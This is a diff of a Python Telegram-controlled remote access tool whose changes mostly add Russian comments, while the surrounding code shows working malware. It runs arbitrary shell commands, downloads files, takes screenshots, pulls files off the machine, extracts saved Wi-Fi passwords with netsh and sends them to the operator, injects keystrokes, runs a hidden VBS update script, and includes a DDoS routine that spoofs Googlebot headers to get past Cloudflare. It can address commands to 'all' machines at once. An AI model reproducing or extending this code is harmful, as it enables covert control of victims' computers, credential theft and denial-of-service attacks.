@@ -122,7 +122,7 @@ class Func_API:
                 logger.log('__init__', 'Вы указали неверный токен')
                 bot.stop_polling()
 
-    def rasbiv(self, text):
+    def rasbiv(self, text): # нормализация и разбив на нужные значения
         texn = text.split()
         texc = text.split("{")[1:]
         for i in range(len(texc)):
@@ -147,7 +147,7 @@ class Func_API:
             os.rename("media/"+path, "media/"+vb+".png")
         return vb
 
-    def cmdo_ret(self, com):
+    def cmdo_ret(self, com): # нужно для работы ф-ции specifications
         try:
             res = subprocess.check_output(com, shell=1)
         except Exception as e:
@@ -163,7 +163,7 @@ class Func_API:
                 return '🖥❌'
         return '🖥✅:\n'+res
 
-    def cmdo(self, com):
+    def cmdo(self, com): # output от выполнения команды в cmd
         try:
             res = subprocess.check_output(com, shell=1)
         except Exception as e:
@@ -179,7 +179,7 @@ class Func_API:
                 bot.send_message(self.id, f'🖥❌ \n{e}')
         bot.send_message(self.id, '🖥✅:\n'+res)
 
-    def cmdi(self, com):
+    def cmdi(self, com): # выполнение команды в cmd
         try:
             os.system(com)
             bot.send_message(self.id, "🖥✅")
@@ -187,7 +187,7 @@ class Func_API:
             logger.log(self.cmdi.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def exits(self):
+    def exits(self): # очищает папку с медиа
         dir = os.listdir("media/")
         for i in dir:
             os.remove("media/"+i)
@@ -225,7 +225,7 @@ class Func_API:
             logger.log(self.ip_address.__name__, 'Ошибка соединения')
             bot.send_message(self.id, 'Ошибка соединения')
 
-    def wgt(self, text_comand):
+    def wgt(self, text_comand): # скачивание файла по ссылке
         try:
             wget.download(text_comand[0], text_comand[1])
             bot.send_message(self.id, "🖥✅")
@@ -233,7 +233,7 @@ class Func_API:
             logger.log(self.wgt.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def rebooting(self, timer):
+    def rebooting(self, timer): # перезагрузка пк
         try:
             timer = "shutdown /r /t "+str(timer)
             os.system(timer)
@@ -242,7 +242,7 @@ class Func_API:
             logger.log(self.rebooting.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def shotdowning(self, timer):
+    def shotdowning(self, timer): # выключение пк
         try:
             timer = "shutdown /s /t "+str(timer)
             os.system(timer)
@@ -251,7 +251,7 @@ class Func_API:
             logger.log(self.shotdowning.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def picture(self, file):
+    def picture(self, file): # открытие картинки из папки с медиа
         try:
             command = f"media\\{file}.png"
             os.startfile(command)
@@ -260,7 +260,7 @@ class Func_API:
             logger.log(self.picture.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def video(self, file):
+    def video(self, file): # открытие видео из папки с медиа
         try:
             command = f"media\\{file}.mp4"
             os.startfile(command)
@@ -269,7 +269,7 @@ class Func_API:
             logger.log(self.video.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def specifications(self):
+    def specifications(self): # возвращает характеристики пк
         x, y = pyautogui.size()
         proc = self.cmdo_ret('powershell "Get-WmiObject -Class Win32_Processor | select Name"').split('\n')[4][:-2]
         ram = int(self.cmdo_ret('powershell "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum"').split("\n")[5].split(': ')[1][:-1])//1073741824
@@ -282,7 +282,7 @@ RAM:            {ram} GB
 Screen:        {x}x{y}"""
         bot.send_message(self.id, banner)
 
-    def rask(self):
+    def rask(self): # меняет раскладку
         try:
             keyboard.press_and_release("alt+shift")
             bot.send_message(self.id, "🖥✅")
@@ -290,7 +290,7 @@ Screen:        {x}x{y}"""
             logger.log(self.specifications.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def screenshot(self):
+    def screenshot(self): # скриншот и его отправка
         filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ','_').replace(':','-')}.jpg"
         pyautogui.screenshot(filename)
         img = open(filename, "rb")
@@ -298,12 +298,12 @@ Screen:        {x}x{y}"""
         img.close()
         os.remove(filename)
 
-    def keyb(self, text):
+    def keyb(self, text): # печать текста
         try:
             text = text.split("+")
             listing = ""
             button = ["shift", "alt", "f1", "f2", "f3", "f4", "f5", "f6", "f7",
-                      "f8", "f9", "f10", "f11", "f12", "tab", "ctrl", "enter", "capslock"]
+                      "f8", "f9", "f10", "f11", "f12", "tab", "ctrl", "enter", "capslock"] # спец. клавиши
             for i in text:
                 try:
                     index = button.index(i)
@@ -318,7 +318,7 @@ Screen:        {x}x{y}"""
             logger.log(self.keyb.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def print_gui(self, text):
+    def print_gui(self, text): # создаёт окно с текстом
         try:
             pyautogui.alert(text, "~")
             bot.send_message(self.id, '🖥✅')
@@ -326,7 +326,7 @@ Screen:        {x}x{y}"""
             logger.log(self.print_gui.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def input_gui(self, text):
+    def input_gui(self, text): # создаёт окно с текстом и полем для ввода
         try:
             answer = pyautogui.prompt(text, "~")
             bot.send_message(self.id, answer)
@@ -334,7 +334,7 @@ Screen:        {x}x{y}"""
             logger.log(self.input_gui.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def closes(self):
+    def closes(self): # закрывает открытое сейчас приложение
         try:
             keyboard.press_and_release("alt+f4")
             bot.send_message(self.id, '🖥✅')
@@ -342,7 +342,7 @@ Screen:        {x}x{y}"""
             logger.log(self.closes.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def start_file(self, path):
+    def start_file(self, path): # запускает файл по его path'у
         try:
             text = "start media/"+path
             os.system(text)
@@ -351,7 +351,7 @@ Screen:        {x}x{y}"""
             logger.log(self.start_file.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def direct(self, paths):
+    def direct(self, paths): # аналог команды tree с глубеной шага 1
         try:
             if paths == ".":
                 paths = os.getcwd()
@@ -385,12 +385,12 @@ exit'''
 
         text_vbs = f'''
 set sh=CreateObject("Wscript.Shell")
-sh.Run "{pth}\\upd.bat", 0'''
+sh.Run "{pth}\\upd.bat", 0''' # текст для скрипта обновы
 
         open('upd.bat', 'w').write(text_bat)
         open('upd.vbs', 'w').write(text_vbs)
         os.startfile('upd.vbs')
-        bot.stop_polling()
+        bot.stop_polling() # остановка бота
 
     def ddos(self, url):
         # Устанавливаем headers Google бота, для обхода Cloudflare
@@ -410,7 +410,7 @@ sh.Run "{pth}\\upd.bat", 0'''
             except:
                 pass
 
-    def pull_file(self, path: str):
+    def pull_file(self, path: str): # отправка файла с пк в тг
         path = path.replace('\\', '/')
         if os.path.exists(path):
             file = open(path, 'rb')
@@ -426,7 +426,7 @@ sh.Run "{pth}\\upd.bat", 0'''
                     '\n|--  '.join(os.listdir(pr))
             bot.send_message(self.id, otv)
 
-    def browser(self, link):
+    def browser(self, link): # открытие ссылки в браузере
         try:
             linke = 'start ' + link
             os.system(linke)
@@ -434,7 +434,8 @@ sh.Run "{pth}\\upd.bat", 0'''
         except Exception as e:
             logger.log(self.browser.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
-    def extract_wifi_passwords(self):
+
+    def extract_wifi_passwords(self): # камуниздинг паролей от wifi
         try:
             otv = ''
             profiles_data = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')
@@ -453,16 +454,15 @@ sh.Run "{pth}\\upd.bat", 0'''
             logger.log(self.extract_wifi_passwords.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
-    def perfor(self, text, id_chat):
+    def perfor(self, text, id_chat): # главный обработчик
         try:
             self.id = id_chat
             text = self.rasbiv(text)
             name_pc = text["name"]
             comnd = text["cmnd"]
-            text_comand = text["text"]
-            print(text_comand)
+            text_comand = text["text"] # преобразования
 
-            if name_pc.lower() == self.NAME_PC or name_pc.lower() == "all":
+            if name_pc.lower() == self.NAME_PC or name_pc.lower() == "all": # выполнения команд
                 if comnd == "wget":
                     self.wgt(text_comand)
 
@@ -601,4 +601,4 @@ def handle_file(message):
             bot.reply_to(message, f"🖥❌\n{e}")
 
 
-bot.infinity_polling()
+bot.infinity_polling() # запуск сканирования новых сообщений от тг
